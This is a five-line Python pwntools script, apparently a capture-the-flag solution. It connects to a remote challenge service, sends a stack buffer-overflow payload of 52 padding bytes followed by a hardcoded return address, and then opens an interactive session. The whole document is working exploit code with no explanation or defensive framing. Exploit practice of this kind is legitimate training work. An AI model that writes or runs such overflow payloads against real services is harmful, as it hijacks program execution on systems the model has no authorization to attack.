from pwn import *
r=remote("thekidofarcrania.com",4902)
payload=b"A"*52+p32(0x08048586)
r.sendlineafter("text:",payload)
r.interactive()
